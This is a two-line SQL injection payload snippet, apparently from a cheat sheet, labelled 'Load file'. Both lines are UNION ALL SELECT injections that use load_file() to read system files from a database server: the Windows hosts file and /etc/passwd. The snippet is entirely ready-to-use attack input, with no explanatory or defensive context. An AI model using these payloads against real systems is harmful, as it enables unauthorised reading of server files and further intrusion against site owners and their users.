# Load file:
union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
union all select 1, 2, load_file('/etc/passwd')
